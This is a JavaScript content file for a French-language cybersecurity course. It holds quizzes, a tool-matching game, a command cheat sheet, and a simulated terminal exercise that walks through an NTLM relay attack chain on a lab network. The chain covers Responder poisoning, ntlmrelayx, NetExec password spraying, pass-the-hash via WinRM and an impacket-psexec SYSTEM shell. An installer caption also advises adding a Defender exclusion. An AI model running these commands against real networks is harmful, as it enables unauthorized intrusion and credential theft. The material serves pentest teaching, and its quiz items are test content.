/* =============================================================
   Windows — Chapitre « Attaques » (théorie + pratique)
   -------------------------------------------------------------
   Complète le cours « systeme-windows » déjà déclaré par
   data/cours/systeme-windows.js :
     - ajoute un guide « Fiche technique » des commandes d'attaque ;
     - ajoute le chapitre « Attaques » : deux QCM (dont un centré
       sur les commandes), un jeu de rapidité, et un exercice
       « terminal » où l'on tape les commandes de l'attaque.

   Contenu pédagogique de sécurité défensive / pentest (protocoles
   NTLM, SMB, empoisonnement de résolution de noms, relais, PtH).
   ============================================================= */

(function () {

  /* =========================================================
     BANQUE — QCM théorie des attaques
     ========================================================= */
  const theorie = [
    {
      enonce: "Qu'est-ce qu'une DLL (Dynamic Link Library) ?",
      choix: [
        "Une bibliothèque dont les fonctions sont chargées en mémoire à l'exécution, au besoin",
        "Un exécutable autonome lancé au démarrage de Windows",
        "Un pilote de périphérique en mode noyau",
        "Un fichier de configuration du registre"
      ],
      reponse: 0,
      explication: "Une DLL est une bibliothèque logicielle chargée dynamiquement à l'exécution ; elle peut être partagée par plusieurs programmes."
    },
    {
      enonce: "En quoi consiste le DLL hijacking ?",
      choix: [
        "Placer une DLL malveillante là où l'application la chargera par défaut",
        "Chiffrer une DLL légitime pour la rendre illisible",
        "Injecter du code dans le noyau NT",
        "Remplacer le fichier SAM par une copie modifiée"
      ],
      reponse: 0,
      explication: "L'attaquant profite de l'ordre de recherche des DLL pour faire charger une bibliothèque corrompue par une application légitime."
    },
    {
      enonce: "Dans l'ordre de recherche standard des DLL, quel emplacement est consulté en premier (après les DLL déjà chargées et les « Known DLLs ») ?",
      choix: [
        "Le répertoire de l'application",
        "C:\\Windows\\System32",
        "Le répertoire courant",
        "Les dossiers listés dans %PATH%"
      ],
      reponse: 0,
      explication: "L'ordre de recherche standard commence par le répertoire de l'application, ce qui rend le hijacking possible si l'attaquant peut y écrire."
    },
    {
      enonce: "Quelle est la taille du challenge généré par le serveur lors d'une authentification NTLM ?",
      choix: ["64 bits", "8 bits", "128 bits", "256 bits"],
      reponse: 0,
      explication: "Le serveur génère un challenge aléatoire de 64 bits qu'il envoie au client."
    },
    {
      enonce: "Que renvoie le client au serveur pendant l'authentification NTLM ?",
      choix: [
        "Le challenge chiffré à l'aide du hash de son mot de passe",
        "Son mot de passe en clair",
        "Son hash NT en clair",
        "Une copie de la base SAM"
      ],
      reponse: 0,
      explication: "Le client combine le challenge et le hash de son mot de passe pour produire la réponse ; le mot de passe ne circule jamais en clair."
    },
    {
      enonce: "Où le serveur (ou le contrôleur de domaine) va-t-il chercher le hash pour vérifier la réponse NTLM ?",
      choix: [
        "Dans la base SAM ou dans NTDS.dit",
        "Dans le fichier hosts",
        "Dans le cache DNS",
        "Dans le registre HKCU"
      ],
      reponse: 0,
      explication: "Les hashs NT sont stockés dans la SAM (comptes locaux) ou dans NTDS.dit (Active Directory)."
    },
    {
      enonce: "Sur quel algorithme repose le hash NT d'un mot de passe Windows ?",
      choix: ["MD4", "MD5", "SHA-256", "DES"],
      reponse: 0,
      explication: "Le hash NT est un MD4 du mot de passe ; c'est ce qui le rend cassable avec de la puissance de calcul."
    },
    {
      enonce: "De quoi est composé un Net-NTLMv2 ?",
      choix: [
        "Du challenge serveur",
        "Du challenge client et d'un timestamp",
        "D'un HMAC-MD5 du hash NT de l'utilisateur",
        "Du mot de passe en clair de l'utilisateur"
      ],
      reponse: [0, 1, 2],
      explication: "Net-NTLMv2 combine challenge serveur, challenge client, timestamp et HMAC-MD5 du hash NT. Le mot de passe en clair n'y figure jamais."
    },
    {
      enonce: "Pourquoi Net-NTLMv1 est-il considéré comme obsolète et dangereux ?",
      choix: [
        "Il utilise du DES avec un challenge de 8 octets",
        "Il envoie le mot de passe en clair",
        "Il n'utilise aucun challenge",
        "Il repose sur SHA-3"
      ],
      reponse: 0,
      explication: "Net-NTLMv1 s'appuie sur du DES avec un challenge à 8 octets : il est cassable trop facilement."
    },
    {
      enonce: "Que permet une attaque Pass-the-Hash ?",
      choix: [
        "S'authentifier directement avec le hash NT, sans connaître le mot de passe en clair",
        "Déchiffrer instantanément le mot de passe",
        "Contourner le pare-feu Windows",
        "Élever ses privilèges via l'UAC"
      ],
      reponse: 0,
      explication: "Posséder le hash NT équivaut à posséder le mot de passe : on peut s'authentifier directement avec."
    },
    {
      enonce: "En quoi consiste une attaque NTLM relay ?",
      choix: [
        "Intercepter une authentification NTLM et la relayer à une cible pour être authentifié à la place du client",
        "Casser le hash NT hors ligne avec un dictionnaire",
        "Rejouer un ticket Kerberos volé",
        "Injecter une DLL dans lsass.exe"
      ],
      reponse: 0,
      explication: "L'attaquant en homme du milieu relaie la réponse valide vers la cible et se retrouve authentifié à la place du client légitime."
    },
    {
      enonce: "Quelle vulnérabilité célèbre est associée à SMB 1.0 ?",
      choix: ["EternalBlue", "Heartbleed", "Log4Shell", "BlueKeep"],
      reponse: 0,
      explication: "SMBv1 n'intègre aucune sécurité moderne (pas de chiffrement, signature faible) et est célèbre pour EternalBlue."
    },
    {
      enonce: "Pourquoi SMB 2.0 reste-t-il exposé aux attaques par relais NTLM par défaut ?",
      choix: [
        "La signature est supportée mais n'est pas forcée par défaut",
        "Le chiffrement de bout en bout est désactivé de force",
        "Il n'accepte aucune authentification",
        "Il transmet le hash NT en clair"
      ],
      reponse: 0,
      explication: "SMB2 supporte la signature mais ne l'impose pas par défaut, ce qui laisse la porte ouverte au SMB relay."
    },
    {
      enonce: "Qu'apporte SMB 3.1.1 côté sécurité ?",
      choix: [
        "La Pre-authentication Integrity et le chiffrement AES-128-GCM",
        "Le retour à SMB1 pour la compatibilité",
        "La suppression de toute signature",
        "Le chiffrement DES"
      ],
      reponse: 0,
      explication: "SMB 3.1.1 ajoute la Pre-authentication Integrity (contre le MitM) et chiffre en AES-128-GCM."
    },
    {
      enonce: "Qu'est-ce que le partage IPC$ et une « session NULL » ?",
      choix: [
        "Un partage administratif exposant des pipes nommés (RPC), parfois accessible sans identifiants",
        "Un partage de fichiers utilisateurs classique",
        "Une clé de la base de registre",
        "Un journal d'événements de sécurité"
      ],
      reponse: 0,
      explication: "IPC$ expose des pipes nommés pour les appels RPC ; certaines configurations acceptent une connexion anonyme, la session NULL."
    },
    {
      enonce: "Lorsqu'un client Windows cherche \\\\srvinconnu, quel mécanisme est utilisé en dernier avant l'échec ?",
      choix: [
        "LLMNR (multicast)",
        "Le fichier hosts local",
        "Le cache DNS",
        "Le serveur DNS configuré"
      ],
      reponse: 0,
      explication: "L'ordre est : hosts, cache DNS, DNS, NBT-NS, puis LLMNR en dernier recours. C'est ce qui rend l'empoisonnement possible."
    },
    {
      enonce: "Pourquoi l'empoisonnement LLMNR/mDNS/NBT-NS fonctionne-t-il ?",
      choix: [
        "L'attaquant répond aux requêtes de résolution diffusées à la place du service légitime",
        "Il exploite une faille du noyau NT",
        "Il désactive le pare-feu à distance",
        "Il force le déchiffrement de SMB3"
      ],
      reponse: 0,
      explication: "Ces protocoles diffusent la requête à tout le segment ; l'attaquant répond « c'est moi » et récupère l'authentification."
    },
    {
      enonce: "Quelle authentification est recommandée à la place de NTLM en environnement Active Directory ?",
      choix: ["Kerberos", "LM", "Net-NTLMv1", "Basic Auth"],
      reponse: 0,
      explication: "Il est recommandé de limiter NTLM et de préférer Kerberos pour l'authentification."
    }
  ];

  /* =========================================================
     BANQUE — QCM centré sur les commandes
     ========================================================= */
  const commandes = [
    {
      enonce: "Quel outil répond aux requêtes LLMNR, NBT-NS et mDNS pour empoisonner la résolution de noms ?",
      choix: ["Responder", "ntlmrelayx", "PsExec", "enum4linux"],
      reponse: 0,
      explication: "Responder est l'empoisonneur : il répond aux requêtes LLMNR/NBT-NS/mDNS avec de fausses adresses."
    },
    {
      enonce: "Dans « sudo responder -I eth0 -dwP », à quoi sert l'option -I ?",
      choix: [
        "À indiquer l'interface réseau d'écoute",
        "À ignorer les erreurs",
        "À importer une liste de cibles",
        "À installer l'outil"
      ],
      reponse: 0,
      explication: "-I précise l'interface (ici eth0) sur laquelle Responder écoute et répond."
    },
    {
      enonce: "Quel outil permet de relayer les authentifications NTLM capturées vers des cibles ?",
      choix: ["ntlmrelayx", "Responder", "nmap", "enum4linux"],
      reponse: 0,
      explication: "ntlmrelayx (Impacket) crée des serveurs SMB/HTTP/LDAP et relaie les authentifications NTLM reçues."
    },
    {
      enonce: "Dans « ntlmrelayx.py -tf targets.txt -smb2support », que désigne -tf ?",
      choix: [
        "Le fichier listant les cibles du relais",
        "Le nombre de threads",
        "Le format de sortie",
        "Le fuseau horaire"
      ],
      reponse: 0,
      explication: "-tf (target file) pointe vers le fichier contenant la liste des cibles ; -smb2support active la prise en charge de SMB2."
    },
    {
      enonce: "Quelle est la structure générale d'une commande NetExec ?",
      choix: [
        "nxc <protocole> <cibles> -u <utilisateur> -p <mot_de_passe> [options]",
        "nxc -u <utilisateur> <protocole> [options] <cibles>",
        "netexec <cibles> <protocole> --run",
        "nxc <mot_de_passe> <utilisateur> <cibles>"
      ],
      reponse: 0,
      explication: "NetExec suit toujours : nxc <protocole> <cibles> -u <utilisateur> -p <mot_de_passe> [options]."
    },
    {
      enonce: "Quelle option de NetExec liste les partages disponibles sur une cible SMB ?",
      choix: ["--shares", "--sessions", "--users", "--exec"],
      reponse: 0,
      explication: "--shares énumère les partages et les droits ; --sessions liste les sessions ouvertes."
    },
    {
      enonce: "Avec NetExec, quelle option permet de s'authentifier avec un hash NT au lieu d'un mot de passe ?",
      choix: ["-H", "-p", "-u", "-x"],
      reponse: 0,
      explication: "-H fournit le hash NT (pass-the-hash) ; il remplace -p (mot de passe en clair)."
    },
    {
      enonce: "Que fait « nxc smb 192.168.1.0/24 -u administrateur -p 'P@ssw0rd!' » ?",
      choix: [
        "Il teste ce login SMB sur tout le sous-réseau /24",
        "Il liste uniquement les partages d'une machine",
        "Il exécute whoami à distance",
        "Il lance un serveur de relais"
      ],
      reponse: 0,
      explication: "La cible est une plage CIDR /24 : la commande teste l'authentification SMB sur les 256 adresses."
    },
    {
      enonce: "Quel script nmap permet de repérer les machines dont la signature SMB n'est pas forcée ?",
      choix: ["smb2-security-mode", "http-title", "ssl-cert", "dns-brute"],
      reponse: 0,
      explication: "nmap --script=smb2-security-mode.nse -p445 <plage> signale « signing enabled but not required »."
    },
    {
      enonce: "À quoi sert enum4linux ?",
      choix: [
        "Énumérer utilisateurs, groupes et partages via des appels RPC anonymes (session NULL)",
        "Casser des hashs NTLM hors ligne",
        "Chiffrer un partage SMB",
        "Relayer des authentifications NTLM"
      ],
      reponse: 0,
      explication: "enum4linux interroge IPC$/RPC en session NULL pour récupérer des informations sur le système distant."
    },
    {
      enonce: "Sur quel partage impacket-psexec écrit-il, imposant des droits d'administrateur ?",
      choix: ["ADMIN$", "IPC$", "C$", "NETLOGON"],
      reponse: 0,
      explication: "psexec copie son service (PSEXESVC.exe) sur ADMIN$ : les droits administrateur sont donc obligatoires."
    },
    {
      enonce: "Quelle option d'impacket-psexec permet de s'authentifier sans le mot de passe du compte ?",
      choix: ["-hashes", "-file", "-target", "-service"],
      reponse: 0,
      explication: "-hashes réalise un pass-the-hash : on fournit le hash NT au lieu du mot de passe en clair."
    },
    {
      enonce: "Dans « psexec -s \\\\REMOTEHOST <commande> », que fait l'option -s ?",
      choix: [
        "Elle exécute la commande en tant que compte LOCAL SYSTEM",
        "Elle établit une connexion silencieuse",
        "Elle synchronise l'horloge",
        "Elle démarre un service SSH"
      ],
      reponse: 0,
      explication: "-s lance le programme distant sous l'identité du compte LOCAL SYSTEM."
    },
    {
      enonce: "Quel est le format de connexion d'impacket-psexec avec mot de passe ?",
      choix: [
        "domaine/utilisateur:motdepasse@hôte",
        "hôte:utilisateur@motdepasse",
        "utilisateur@hôte -p motdepasse",
        "hôte/motdepasse:utilisateur"
      ],
      reponse: 0,
      explication: "La cible s'écrit domaine/username:password@host."
    },
    {
      enonce: "Qu'obtient-on en relayant l'authentification d'un compte à privilèges administratifs vers une machine via SMB ?",
      choix: [
        "L'extraction (dump) de la base SAM et de ses hashs",
        "Le mot de passe Kerberos en clair",
        "La désactivation du pare-feu",
        "Un accès physique à la machine"
      ],
      reponse: 0,
      explication: "Avec un compte admin relayé, ntlmrelayx peut extraire la base SAM ; les hashs peuvent ensuite servir en pass-the-hash."
    }
  ];

  /* =========================================================
     EXERCICE TERMINAL — chaîne d'attaque NTLM relay
     ========================================================= */
  const objectifs = [
    {
      enonce: "Repérez les machines du réseau **10.10.10.0/24** dont la signature SMB n'est pas forcée, avec **nmap** et le script `smb2-security-mode` sur le port 445.",
      indice: "nmap --script=smb2-security-mode.nse -p445 <range>",
      motifs: ["^nmap\\b", "smb2-security-mode", "-p\\s*445", "10\\.10\\.10\\.0/24"],
      solution: "nmap --script=smb2-security-mode.nse -p445 10.10.10.0/24",
      sortie:
"Nmap scan report for 10.10.10.20\n" +
"Host is up (0.012s latency).\n" +
"PORT    STATE SERVICE\n" +
"445/tcp open  microsoft-ds\n" +
"| smb2-security-mode:\n" +
"|   3:1:1:\n" +
"|_    Message signing enabled but not required   <-- relayable"
    },
    {
      enonce: "Énumérez l'hôte **10.10.10.5** par session NULL (RPC anonyme) avec **enum4linux** en énumération complète.",
      indice: "enum4linux -a <host>",
      motifs: ["^enum4linux\\b", "-a\\b", "10\\.10\\.10\\.5"],
      solution: "enum4linux -a 10.10.10.5",
      sortie:
"Starting enum4linux on 10.10.10.5\n" +
"[+] Got domain/workgroup name: MILKYWAY\n" +
"[+] Session NULL établie sur IPC$\n" +
"[+] Users: administrateur, pentest, guest, krbtgt"
    },
    {
      enonce: "Lancez **Responder** pour empoisonner LLMNR / NBT-NS / mDNS sur l'interface **eth0**.",
      indice: "sudo responder -I <interface> -dwP",
      motifs: ["\\bresponder\\b", "-I\\s*eth0"],
      solution: "sudo responder -I eth0 -dwP",
      sortie:
"NBT-NS, LLMNR & MDNS Responder\n" +
"[+] Poisoners:\n" +
"    LLMNR    [ON]\n" +
"    NBT-NS   [ON]\n" +
"    MDNS     [ON]\n" +
"[+] Listening for events..."
    },
    {
      enonce: "Démarrez le **relais NTLM** vers les cibles listées dans `targets.txt` avec la prise en charge de SMB2, via **ntlmrelayx**.",
      indice: "ntlmrelayx.py -tf <file> -smb2support",
      motifs: ["ntlmrelayx", "-tf\\s+targets\\.txt", "-smb2support"],
      solution: "ntlmrelayx.py -tf targets.txt -smb2support",
      sortie:
"Impacket ntlmrelayx\n" +
"[*] Protocol Client SMB loaded..\n" +
"[*] Running in relay mode to hosts in targetfile\n" +
"[*] Setting up SMB Server\n" +
"[*] Servers started, waiting for connections..."
    },
    {
      enonce: "Un relais a réussi. Testez le compte **pentest** (mot de passe **Autumn2024!**) en **SMB** sur tout le sous-réseau **10.10.10.0/24** avec **NetExec**.",
      indice: "nxc smb <range> -u <user> -p <pass>",
      motifs: ["^nxc\\s+smb\\b", "10\\.10\\.10\\.0/24", "-u\\s+pentest", "-p\\s+"],
      solution: "nxc smb 10.10.10.0/24 -u pentest -p 'Autumn2024!'",
      sortie:
"SMB  10.10.10.20  445  WORKSTATION20  [*] Windows 10 (name:WORKSTATION20) (domain:milkyway.local)\n" +
"SMB  10.10.10.20  445  WORKSTATION20  [+] milkyway.local\\pentest:Autumn2024! (Pwn3d!)"
    },
    {
      enonce: "Listez les **partages** de **10.10.10.20** en SMB avec le compte **pentest**.",
      indice: "nxc smb <host> -u <user> -p <pass> --shares",
      motifs: ["^nxc\\s+smb\\b", "10\\.10\\.10\\.20", "-u\\s+pentest", "--shares"],
      solution: "nxc smb 10.10.10.20 -u pentest -p 'Autumn2024!' --shares",
      sortie:
"SMB  10.10.10.20  445  WORKSTATION20  [+] Enumerated shares\n" +
"Share      Permissions   Remark\n" +
"ADMIN$     READ,WRITE    Remote Admin\n" +
"C$         READ,WRITE    Default share\n" +
"IPC$       READ          Remote IPC"
    },
    {
      enonce: "Exécutez **whoami** via **WinRM** sur **10.10.10.20** en **pass-the-hash** : compte **Administrateur**, hash NT `31d6cfe0d16ae931b73c59d7e0c089c0`.",
      indice: "nxc winrm <target> -u <user> -H <hash> -x \"whoami\"",
      motifs: ["^nxc\\s+winrm\\b", "10\\.10\\.10\\.20", "-u\\s+administrateur", "-H\\s+31d6cfe0d16ae931b73c59d7e0c089c0", "-x\\s"],
      solution: "nxc winrm 10.10.10.20 -u Administrateur -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x \"whoami\"",
      sortie:
"WINRM  10.10.10.20  5985  WORKSTATION20  [+] milkyway.local\\Administrateur (Pwn3d!)\n" +
"WINRM  10.10.10.20  5985  WORKSTATION20  workstation20\\administrateur"
    },
    {
      enonce: "Ouvrez un shell **SYSTEM** distant sur **10.10.10.20** avec **impacket-psexec** en **pass-the-hash** (compte Administrateur, même hash NT).",
      indice: "impacket-psexec <user>@<host> -hashes :<ntHash>",
      motifs: ["\\bpsexec\\b", "administrateur@10\\.10\\.10\\.20", "-hashes\\s+:?.*31d6cfe0d16ae931b73c59d7e0c089c0"],
      solution: "impacket-psexec Administrateur@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0",
      sortie:
"Impacket psexec\n" +
"[*] Requesting shares on 10.10.10.20.....\n" +
"[*] Found writable share ADMIN$\n" +
"[*] Uploading file PSEXESVC.exe\n" +
"[*] Creating service on 10.10.10.20.....\n" +
"Microsoft Windows [Version 10.0.19045]\n" +
"C:\\Windows\\system32> "
    }
  ];

  /* =========================================================
     Rattachement au cours « systeme-windows »
     ========================================================= */
  const cours = CONTENU["systeme-windows"];

  cours.guides = (cours.guides || []).concat([
    {
      id: "commandes-attaque",
      titre: "Fiche technique — Commandes d'attaque AD",
      badge: "Fiche technique",
      resume: "Syntaxe des outils de la partie pratique : nmap, enum4linux, Responder, ntlmrelayx, NetExec (nxc) et PsExec. Un tableau d'options et un exemple commenté par outil.",
      niveau: "Référence",
      sections: [
        { type: "partie", titre: "Installation des outils", texte: "Un script installe tous les outils de ce chapitre : une version Windows et une version Linux. Chacun part du principe que vous n'avez rien d'installé, vérifie ce qui est déjà présent et n'installe rien en double." },
        {
          titre: "Scripts d'installation (Windows et Linux)",
          texte: "Téléchargez le script de votre système, **lisez-le**, puis exécutez-le. Il installe d'abord les gestionnaires manquants (winget + pip/pipx sous Windows ; apt/dnf/pacman + pipx sous Linux), puis chaque outil **seulement s'il est absent**.",
          telechargements: [
            {
              nom: "installer-outils.cmd",
              source: "installateur-outils-windows",
              legende: "**Windows** : à lancer en administrateur. Ajoute une exclusion Defender pour les dossiers `pipx` et `outils-attaques`, sinon l'antivirus supprime impacket et NetExec pendant l'installation."
            },
            {
              nom: "installer-outils.sh",
              source: "installateur-outils-linux",
              legende: "**Linux** : `bash installer-outils.sh`. N'utilise `sudo` qu'au besoin."
            }
          ],
          points: [
            "**Outils installés :** `nmap`, **Impacket** (`impacket-ntlmrelayx`, `impacket-psexec`…), **NetExec** (`nxc`), `enum4linux-ng`, **Responder**, et **PsExec** (Sysinternals) sous Windows.",
            "**Sans doublon :** chaque outil est testé avant installation (`where` / `command -v`, `pipx list`) ; rien n'est réinstallé s'il est déjà là.",
            "**Sources officielles uniquement :** winget, PyPI (via `pipx`, en environnements isolés), le dépôt du système et les dépôts GitHub officiels en HTTPS (NetExec, enum4linux-ng, Responder). Aucun `curl | bash`."
          ]
        },
        {
          titre: "Comment l'exécuter",
          texte: "Le script doit être lancé depuis un shell avec les droits administrateurs."
        },
        { type: "partie", titre: "Reconnaissance", texte: "Repérer les cibles relayables et énumérer sans identifiants." },
        {
          titre: "nmap — repérer SMB sans signature forcée",
          texte: "Le script `smb2-security-mode` indique si la signature SMB est **exigée**. Une machine « signing not required » est relayable.",
          tableau: {
            entetes: ["Élément", "Rôle"],
            lignes: [
              ["`--script=smb2-security-mode.nse`", "Script NSE qui lit le mode de signature SMB"],
              ["`-p445`", "Port SMB à scanner"],
              ["`10.10.10.0/24`", "Plage de cibles (notation CIDR)"]
            ]
          },
          code: "nmap --script=smb2-security-mode.nse -p445 10.10.10.0/24",
          legende: "Repérer les cibles relayables",
          remarque: "« Message signing enabled but not required » = cible vulnérable au relais NTLM."
        },
        {
          titre: "enum4linux — session NULL sur IPC$",
          texte: "Interroge le partage `IPC$` par appels **RPC anonymes** (session NULL) pour lister utilisateurs, groupes et partages.",
          tableau: {
            entetes: ["Élément", "Rôle"],
            lignes: [
              ["`enum4linux`", "Outil d'énumération SMB / RPC"],
              ["`-a`", "Énumération complète (all)"],
              ["`10.10.10.5`", "Hôte cible"]
            ]
          },
          code: "enum4linux -a 10.10.10.5",
          attention: "Ne fonctionne que si la cible autorise la session NULL (connexion anonyme à IPC$)."
        },

        { type: "partie", titre: "Empoisonnement et relais", texte: "Capturer puis relayer les authentifications NTLM." },
        {
          titre: "Responder — empoisonner LLMNR / NBT-NS / mDNS",
          texte: "Répond aux requêtes de résolution de noms **échouées** à la place du service légitime, pour capturer les challenges Net-NTLMv2.",
          tableau: {
            entetes: ["Option", "Rôle"],
            lignes: [
              ["`-I eth0`", "Interface d'écoute"],
              ["`-w`", "Serveur proxy WPAD"],
              ["`-d`", "Répond aux requêtes DHCP"],
              ["`-P`", "Force l'authentification du proxy"]
            ]
          },
          code: "sudo responder -I eth0 -dwP",
          remarque: "Pour un relais, désactivez `SMB` et `HTTP` dans `Responder.conf` : ils sont pris en charge par ntlmrelayx."
        },
        {
          titre: "ntlmrelayx — relayer l'authentification NTLM",
          texte: "Reçoit les authentifications empoisonnées et les **relaie** vers des cibles. Sur un compte administrateur, extrait la base SAM.",
          tableau: {
            entetes: ["Option", "Rôle"],
            lignes: [
              ["`-tf targets.txt`", "Fichier listant les cibles (target file)"],
              ["`-t <cible>`", "Une seule cible"],
              ["`-smb2support`", "Active la prise en charge de SMB2"]
            ]
          },
          code: "ntlmrelayx.py -tf targets.txt -smb2support",
          remarque: "Sous Kali, l'outil s'appelle `impacket-ntlmrelayx` (même comportement)."
        },

        { type: "partie", titre: "NetExec (nxc)", texte: "Le « couteau suisse » multi-protocoles pour Active Directory." },
        {
          titre: "Structure de la commande",
          texte: "NetExec suit toujours la forme `nxc <protocole> <cibles> -u <utilisateur> -p <mot_de_passe> [options]`.",
          tableau: {
            entetes: ["Élément", "Rôle"],
            lignes: [
              ["`<protocole>`", "smb, winrm, ldap, mssql, ssh, ftp…"],
              ["`<cibles>`", "IP, plage CIDR (`/24`) ou fichier"],
              ["`-u` / `-p`", "Utilisateur / mot de passe"]
            ]
          },
          code: "nxc smb 10.10.10.0/24 -u pentest -p 'Autumn2024!'",
          legende: "Tester un login sur tout le sous-réseau",
          remarque: "`(Pwn3d!)` signale un compte administrateur local sur la cible."
        },
        {
          titre: "Énumérer partages et sessions",
          tableau: {
            entetes: ["Option", "Rôle"],
            lignes: [
              ["`--shares`", "Liste les partages et les droits"],
              ["`--sessions`", "Liste les sessions ouvertes"],
              ["`--users`", "Liste les comptes du domaine"]
            ]
          },
          codes: [
            { code: "nxc smb 10.10.10.20 -u pentest -p 'Autumn2024!' --shares", legende: "Partages" },
            { code: "nxc smb 10.10.10.20 -u pentest -p 'Autumn2024!' --sessions", legende: "Sessions" }
          ]
        },
        {
          titre: "Exécuter une commande et pass-the-hash",
          tableau: {
            entetes: ["Option", "Rôle"],
            lignes: [
              ["`-x \"cmd\"`", "Exécute une commande à distance"],
              ["`-H <hash>`", "S'authentifie avec le hash NT au lieu de `-p`"]
            ]
          },
          code: "nxc winrm 10.10.10.20 -u Administrateur -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x \"whoami\"",
          legende: "WinRM en pass-the-hash",
          attention: "`-H` remplace `-p` : le mot de passe en clair n'est pas nécessaire."
        },

        { type: "partie", titre: "PsExec / Impacket", texte: "Exécution de commandes à distance et mouvement latéral." },
        {
          titre: "psexec — exécution distante",
          texte: "Copie un service (`PSEXESVC.exe`) sur le partage `ADMIN$` puis exécute la commande. Droits administrateur requis.",
          tableau: {
            entetes: ["Élément", "Rôle"],
            lignes: [
              ["`\\\\HOST`", "Machine distante (notation UNC)"],
              ["`-s`", "Exécute en tant que LOCAL SYSTEM"],
              ["`<commande>`", "Programme à lancer sur la cible"]
            ]
          },
          code: "psexec -s \\\\REMOTEHOST cmd",
          legende: "Shell SYSTEM distant"
        },
        {
          titre: "impacket-psexec & pass-the-hash",
          texte: "Version Python de PsExec, lançable depuis Linux. La cible s'écrit `domaine/utilisateur:motdepasse@hôte`.",
          tableau: {
            entetes: ["Élément", "Rôle"],
            lignes: [
              ["`user:pass@host`", "Identifiants et cible"],
              ["`-hashes :<NT>`", "Pass-the-hash (LM vide, hash NT après `:`)"]
            ]
          },
          codes: [
            { code: "impacket-psexec 'contoso/administrateur:P@ssw0rd@10.10.10.20'", legende: "Avec mot de passe" },
            { code: "impacket-psexec Administrateur@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0", legende: "Pass-the-hash" }
          ],
          attention: "Le hash LM est laissé vide : le `:` initial devant le hash NT est obligatoire."
        }
      ]
    }
  ]);

  cours.chapitres.push({
    id: "attaques",
    titre: "Attaques",
    description: "Théorie (NTLM, SMB, empoisonnement, relais, pass-the-hash) et mise en pratique des commandes dans un terminal.",
    exercices: [
      {
        type: "qcm",
        id: "win-attaques-theorie",
        titre: "QCM — Théorie des attaques",
        description: "DLL hijacking, authentification et relais NTLM, hash NT vs Net-NTLM, SMB, session NULL et empoisonnement de résolution de noms.",
        cours: [
          "Mini-cours express avant de vous lancer :",
          [
            "**NTLM** : challenge/réponse. Le serveur envoie un challenge de 64 bits ; le client répond avec le **hash** de son mot de passe (jamais le mot de passe en clair).",
            "**Hash NT** = MD4 du mot de passe, stocké dans **SAM** ou **NTDS.dit**. **Net-NTLMv2** = challenge serveur + challenge client + timestamp + HMAC-MD5.",
            "**Pass-the-hash** : posséder le hash NT suffit pour s'authentifier.",
            "**NTLM relay** : l'attaquant relaie une authentification vers une cible et se fait passer pour la victime.",
            "**SMB** : signature non forcée par défaut = relayable ; SMBv1 = faille **EternalBlue**.",
            "**LLMNR / NBT-NS / mDNS** : l'attaquant répond aux requêtes diffusées (**Responder**) pour capturer des Net-NTLMv2. Préférer **Kerberos**."
          ]
        ],
        tirage: 12,
        melangerChoix: true,
        questions: theorie
      },
      {
        type: "qcm",
        id: "win-attaques-commandes",
        titre: "QCM — Commandes des attaques",
        description: "Reconnaître l'outil, l'option et la commande : Responder, ntlmrelayx, NetExec (nxc), nmap, enum4linux et PsExec.",
        cours: [
          "Mini-cours express — les outils en un coup d'œil :",
          [
            "**Responder** : empoisonne LLMNR / NBT-NS / mDNS (`-I` = interface).",
            "**ntlmrelayx** : relaie l'authentification NTLM (`-tf` = fichier de cibles, `-smb2support`).",
            "**NetExec** : `nxc <protocole> <cibles> -u <user> -p <pass>` ; options `--shares`, `--sessions`, `-x` (commande), `-H` (hash NT).",
            "**nmap** `smb2-security-mode` : repère les cibles dont la signature SMB n'est pas forcée.",
            "**enum4linux** : énumération par session NULL (RPC anonyme).",
            "**PsExec / impacket-psexec** : exécution distante via `ADMIN$` ; `-hashes` pour le pass-the-hash."
          ]
        ],
        tirage: 12,
        melangerChoix: true,
        questions: commandes
      },
      {
        type: "jetpunk",
        id: "win-attaques-outils",
        titre: "Quel outil pour quelle tâche ?",
        consigne: "Nommez l'outil décrit sur chaque tuile.",
        temps: 150,
        colonnes: 2,
        melanger: true,
        tirage: 6,
        items: [
          { indice: "Empoisonne LLMNR, NBT-NS et mDNS", reponse: "Responder" },
          { indice: "Relaie les authentifications NTLM vers des cibles", reponse: "ntlmrelayx", alt: ["ntlmrelayx.py", "impacket-ntlmrelayx"] },
          { indice: "« Couteau suisse » AD multi-protocoles (SMB, WinRM, LDAP…)", reponse: "NetExec", alt: ["nxc"] },
          { indice: "Exécute des commandes à distance via le partage ADMIN$", reponse: "PsExec", alt: ["psexec", "impacket-psexec"] },
          { indice: "Énumère un hôte par session NULL / RPC anonyme", reponse: "enum4linux" },
          { indice: "Repère les hôtes dont la signature SMB n'est pas forcée", reponse: "nmap" },
          { indice: "Suite Python d'exploitation Active Directory", reponse: "Impacket", alt: ["impacket"] }
        ]
      },
      {
        type: "terminal",
        id: "win-attaques-terminal",
        titre: "Terminal — Chaîne d'attaque NTLM relay",
        description: "Menez l'attaque de bout en bout : reconnaissance, empoisonnement, relais, puis pass-the-hash.",
        terminal: "bash — attacker box",
        invite: "kali@kali:~$",
        cours: [
          "Chaque objectif attend **la bonne commande**. Tapez-la puis Entrée ; une sortie réaliste s'affiche quand l'objectif est atteint. Le terminal répond en anglais, comme un vrai shell.",
          ["`help` — un indice sur l'objectif", "`solution` — la commande (ne compte pas dans le score)", "`objective` — rappeler l'objectif", "`clear` — vider l'écran"]
        ],
        intro: [
          "Vous êtes en test d'intrusion **autorisé** sur le réseau `10.10.10.0/24`.",
          "Objectif global : de la reconnaissance jusqu'à un shell SYSTEM, en passant par un relais NTLM et un pass-the-hash. Suivez les objectifs dans l'ordre."
        ],
        objectifs: objectifs
      }
    ]
  });

})();
